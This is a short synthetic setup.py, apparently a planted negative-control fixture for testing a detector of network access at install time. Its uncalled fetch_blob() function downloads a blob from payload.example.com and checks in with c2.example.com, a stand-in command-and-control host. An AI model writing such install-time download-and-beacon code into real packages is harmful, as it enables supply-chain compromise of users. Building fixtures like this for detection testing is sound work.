# PLANTED negative-control fixture (T2 / Python network-at-install). Synthetic.
from setuptools import setup
import urllib.request
import requests

def fetch_blob():
    urllib.request.urlretrieve("https://payload.example.com/blob", "blob.bin")
    requests.get("https://c2.example.com/checkin")

setup(name="planted-t2-py", version="0.0.0", cmdclass={})
